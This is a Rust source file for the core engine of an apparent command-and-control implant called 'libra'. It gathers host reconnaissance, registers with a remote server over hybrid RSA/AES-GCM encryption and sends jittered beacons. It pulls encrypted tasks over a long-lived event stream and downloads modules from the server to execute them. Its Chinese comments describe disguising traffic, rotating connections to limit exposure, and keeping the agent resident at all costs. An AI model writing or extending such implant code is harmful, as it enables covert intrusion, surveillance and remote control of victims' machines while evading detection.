use rand::Rng;
use serde_json::Value;

use libra_comm::http::HttpCommunicator;
use libra_crypto::AgentCrypto;

use crate::config::ConfigManager;
use crate::engine::heartbeat::{handle_task, heartbeat_tick, jittered_interval};
use crate::module_manager::ModuleManager;

mod heartbeat;
mod utils;

pub struct AgentEngine {
    config: ConfigManager,
    crypto: AgentCrypto,
    http: Option<HttpCommunicator>,
    agent_id: String,
    /// Per-session channel token issued at registration (rotates per session).
    session_token: String,
    /// 流量伪装 profile（单入口/壳字段/UA/padding），注册响应下发。
    profile: Option<libra_common::models::ProfileTransform>,
}

impl AgentEngine {
    pub fn new(config: ConfigManager) -> Self {
        Self {
            config,
            crypto: AgentCrypto::new(),
            http: None,
            agent_id: String::new(),
            session_token: String::new(),
            profile: None,
        }
    }

    pub fn agent_id(&self) -> &str {
        &self.agent_id
    }

    // ── Main entry point ─────────────────────────────────────────────

    pub async fn run(&mut self) -> Result<(), String> {
        // 注册/会话失败统一重试（指数退避 5s→10s→…→300s 封顶）：
        // SESSION_LOST = 快速重注册（服务端密钥轮换/重启）；其他错误
        // （服务端不可达/公钥失配 401 等）也绝不退出——agent 常驻是第一原则。
        let mut backoff_secs: u64 = 5;
        loop {
            match self.run_once().await {
                // 会话丢失（服务端重启/重启后 token 失效）：重置通道状态，
                // 重新走注册流程（新 token + 可能的新会话密钥）。crypto 的
                // RSA keypair 保留——服务端若仍持有旧 session key 则复用，
                // 否则重新下发（清 session key 强制协商）。
                Err(e) if e == "SESSION_LOST" => {
                    libra_common::dlog!("[INFO] session lost — re-registering");
                    self.http = None;
                    self.session_token.clear();
                    self.profile = None;
                    // 强制协商新会话密钥：服务端重启后其内存/Mongo 中的 key
                    // 可能与 agent 持有的失配，保留旧 key 会死循环。
                    self.crypto.clear_session_key();
                    backoff_secs = 5;
                    continue;
                }
                Err(e) => {
                    libra_common::dlog!("[WARN] agent error: {e} — retrying in {backoff_secs}s");
                    self.http = None;
                    self.session_token.clear();
                    self.profile = None;
                    tokio::time::sleep(std::time::Duration::from_secs(backoff_secs)).await;
                    backoff_secs = (backoff_secs * 2).min(300);
                    continue;
                }
                Ok(()) => return Ok(()),
            }
        }
    }

    async fn run_once(&mut self) -> Result<(), String> {
        self.crypto.generate_key_pair();

        let hw = libra_platform::hardware::collect();
        let hw_json = libra_platform::hardware::serialize(&hw);

        libra_modules::recon::NetworkInfo::warmup_geo().await;

        let mut http = HttpCommunicator::new(
            &self.config.server_url,
            &self.config.register_path,
            &self.config.heartbeat_path,
            &self.config.result_path,
        );

        // 构建时注入的流量伪装（UA/附加头/路径后缀）在注册前生效
        // （注册请求本身也带伪装）；注册后服务端 profile 覆盖。
        http.set_build_style(
            self.config.user_agents.clone(),
            self.config.extra_headers.clone(),
            self.config.path_suffixes.clone(),
        );
        // 服务端 RSA 公钥：注册混合加密
        if !self.config.server_public_key.is_empty() {
            http.set_server_public_key(self.config.server_public_key.clone());
        }

        let sys_json = libra_modules::recon::SystemInfo::collect();
        let sys: Value = serde_json::from_str(&sys_json).unwrap_or(Value::Null);
        let hostname = sys["hostname"].as_str().unwrap_or("unknown");
        let user_name = sys["userName"].as_str().unwrap_or("unknown");
        let os_version = sys["osVersion"].as_str().unwrap_or("unknown");
        let arch = sys["arch"].as_str().unwrap_or("unknown");

        let outcome = http
            .register(
                hostname,
                user_name,
                os_version,
                arch,
                self.crypto.rsa_public_key().unwrap_or(""),
                &self.config.beacon_secret,
                &hw_json,
                self.crypto.session_key().is_some(),
            )
            .await?;

        let agent_id = outcome.agent_id;
        let session_key = outcome.session_key;
        self.session_token = outcome.session_token.clone().unwrap_or_default();

        // 采用单入口流量伪装 profile（路径/壳字段/UA/padding）
        if let Some(p) = outcome.profile {
            self.profile = Some(p.clone());
            http.set_profile(p);
        }
        // 心跳节奏覆盖（服务端 profile 下发值优先于构建时值）
        if outcome.heartbeat_interval_ms > 0 {
            self.config.heartbeat_interval_ms = outcome.heartbeat_interval_ms;
        }
        if outcome.jitter_percent > 0.0 {
            self.config.jitter_percent = outcome.jitter_percent;
        }

        // Establish AES-256-GCM session key from the RSA-encrypted blob.
        if let Some(key) = session_key {
            if let Err(e) = self.crypto.set_session_key(&key) {
                libra_common::dlog!("[WARN] Failed to set session key: {}", e);
            } else {
                libra_common::dlog!("[INFO] AES-256-GCM session key established");
            }
        } else {
            libra_common::dlog!("[WARN] Server did not return a session key (encryption disabled)");
        }

        libra_common::dlog!(
            "[INFO] registered | agent_id={} | hostname={}",
            agent_id,
            hostname
        );
        self.agent_id = agent_id;
        self.http = Some(http);

        self.main_loop().await
    }

    // ── Main event loop（本体零 WS：wsNeeded 只驱动 realtime 模块）────

    async fn main_loop(&mut self) -> Result<(), String> {
        let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
        let agent_id = self.agent_id.clone();
        let server_url = self.config.server_url.clone();
        let register_path = self.config.register_path.clone();

        let hb_key = self.crypto.session_key();
        let hb_interval_ms = self.config.heartbeat_interval_ms;
        let hb_jitter = self.config.jitter_percent;
        let session_token = self.session_token.clone();
        let profile = self.profile.clone();

        // Cloud module manager — downloads modules on demand (shared with the
        // heartbeat task that executes one-shot tasks).
        let module_manager = std::sync::Arc::new(tokio::sync::Mutex::new(ModuleManager::new(
            &server_url,
            &register_path,
            &register_path,
            &register_path,
            agent_id.clone(),
            hb_key,
            Some(session_token.clone()),
        )));

        // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
        // with the session key, with per-tick jitter. Signals a re-register if
        // the session is lost (e.g. the server restarted).
        let (reconnect_tx, mut reconnect_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
        let hb_mm = module_manager.clone();
        let hb_reconnect = reconnect_tx.clone();
        // 主循环（SSE 重注册信号）仍要使用这些值：spawn 前各留一份副本
        let hb_agent_id = agent_id.clone();
        let hb_server_url = server_url.clone();
        let hb_register_path = register_path.clone();
        let hb_session_token = session_token.clone();
        let hb_profile = profile.clone();
        tokio::spawn(async move {
            let mut hb_http = HttpCommunicator::new(
                &hb_server_url,
                &hb_register_path,
                &hb_register_path,
                &hb_register_path,
            );
            if !hb_session_token.is_empty() {
                hb_http.set_session_token(hb_session_token);
            }
            if let Some(p) = hb_profile {
                hb_http.set_profile(p);
            }
            let hb_http = std::sync::Arc::new(hb_http);
            loop {
                match heartbeat_tick(&hb_http, &hb_agent_id, hb_key.as_ref(), &hb_mm).await {
                    Ok(()) => {}
                    Err(e) if e == "SESSION_LOST" => {
                        libra_common::dlog!("[WARN] session lost — triggering re-registration");
                        let _ = hb_reconnect.send(());
                        break;
                    }
                    _ => {}
                }

                // beacon sleep：块状抖动（普通 sleep，无镜像混淆）。
                let interval_ms = jittered_interval(hb_interval_ms, hb_jitter);
                tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
            }
        });

        // ── SSE 任务事件流（唯一任务通道）──
        // 长连接等待服务端推送任务；断线 3s 退避重连；SESSION_LOST → 重注册。
        // 任务执行与心跳共用 handle_task（task.id 去重，双通道幂等）。
        let sse_mm = module_manager.clone();
        let sse_reconnect = reconnect_tx.clone();
        let sse_server_url = server_url.clone();
        let sse_register_path = register_path.clone();
        let sse_agent_id = agent_id.clone();
        let sse_session_token = session_token.clone();
        let sse_profile = profile.clone();
        let sse_key = hb_key; // Option<[u8;32]> Copy
        tokio::spawn(async move {
            use futures_util::StreamExt;
            let mut sse_http = HttpCommunicator::new(
                &sse_server_url,
                &sse_register_path,
                &sse_register_path,
                &sse_register_path,
            );
            if !sse_session_token.is_empty() {
                sse_http.set_session_token(sse_session_token);
            }
            if let Some(p) = sse_profile {
                sse_http.set_profile(p);
            }
            let sse_http = std::sync::Arc::new(sse_http);
            loop {
                match sse_http
                    .open_events(sse_key.as_ref().unwrap_or(&[0u8; 32]))
                    .await
                {
                    Ok(resp) => {
                        let mut stream = resp.bytes_stream();
                        let mut buf: Vec<u8> = Vec::with_capacity(4096);
                        // 有界连接生命周期（5-15 分钟随机）：长连接有固定暴露窗口，
                        // 主动轮换更接近"短会话"业务行为，也避免连接泄漏累积。
                        let lifetime =
                            std::time::Duration::from_secs(rand::thread_rng().gen_range(300..=900));
                        let start = std::time::Instant::now();
                        loop {
                            let remaining = lifetime.saturating_sub(start.elapsed());
                            if remaining.is_zero() {
                                libra_common::dlog!("[sse] session lifetime reached — rotating");
                                break;
                            }
                            match tokio::time::timeout(remaining, stream.next()).await {
                                Ok(Some(Ok(chunk))) => buf.extend_from_slice(&chunk),
                                Ok(Some(Err(e))) => {
                                    libra_common::dlog!("[sse] read error: {e}");
                                    break;
                                }
                                Ok(None) => break,
                                Err(_) => {
                                    // lifetime 到期：主动轮换连接
                                    libra_common::dlog!(
                                        "[sse] session lifetime reached — rotating"
                                    );
                                    break;
                                }
                            }
                            // 按行解析（chunk 可能跨行/多行）
                            while let Some(pos) = buf.iter().position(|&b| b == b'\n') {
                                let line: Vec<u8> = buf.drain(..=pos).collect();
                                let line = String::from_utf8_lossy(&line);
                                let line = line.trim();
                                if let Some(data) = line.strip_prefix("data:") {
                                    let cipher = data.trim();
                                    if cipher.is_empty() {
                                        continue;
                                    }
                                    match libra_crypto::decrypt_payload(
                                        cipher,
                                        sse_key.as_ref().unwrap_or(&[0u8; 32]),
                                    ) {
                                        Ok(plain) => {
                                            if let Ok(v) = serde_json::from_str::<Value>(&plain) {
                                                if v["op"].as_str() == Some("task") {
                                                    match serde_json::from_value::<
                                                        libra_common::models::AgentTask,
                                                    >(
                                                        v["data"].clone()
                                                    ) {
                                                        Ok(task) => {
                                                            // 并发执行：长任务（模块下载/执行）不阻塞后续任务。
                                                            let h = sse_http.clone();
                                                            let mm2 = sse_mm.clone();
                                                            let aid = sse_agent_id.clone();
                                                            tokio::spawn(async move {
                                                                handle_task(
                                                                    &h,
                                                                    &task,
                                                                    &aid,
                                                                    sse_key.as_ref(),
                                                                    &mm2,
                                                                )
                                                                .await;
                                                            });
                                                        }
                                                        Err(e) => libra_common::dlog!(
                                                            "[sse] task parse failed: {e} | raw={}",
                                                            v["data"].to_string()
                                                        ),
                                                    }
                                                }
                                            }
                                        }
                                        Err(e) => libra_common::dlog!("[sse] decrypt failed: {e}"),
                                    }
                                }
                                // 注释行（: ping）与空行忽略
                            }
                        }
                        libra_common::dlog!("[sse] stream ended — reconnecting");
                    }
                    Err(e) if e == "SESSION_LOST" => {
                        libra_common::dlog!("[sse] session lost — re-registering");
                        let _ = sse_reconnect.send(());
                        break;
                    }
                    Err(e) => libra_common::dlog!("[sse] open failed: {e}"),
                }
                tokio::time::sleep(std::time::Duration::from_secs(3)).await;
            }
        });

        // ── 主循环：等待重注册信号（SESSION_LOST）──
        // 循环体所有分支都 return（有意挂起直到信号/退出），clippy never_loop 属误报
        #[allow(clippy::never_loop)]
        loop {
            tokio::select! {
                _ = reconnect_rx.recv() => {
                    libra_common::dlog!("[INFO] re-registering with server");
                    return Err("SESSION_LOST".into());
                }
                _ = tokio::signal::ctrl_c() => {
                    libra_common::dlog!("[INFO] ctrl-c received — shutting down");
                    return Ok(());
                }
            }
        }
    }
}
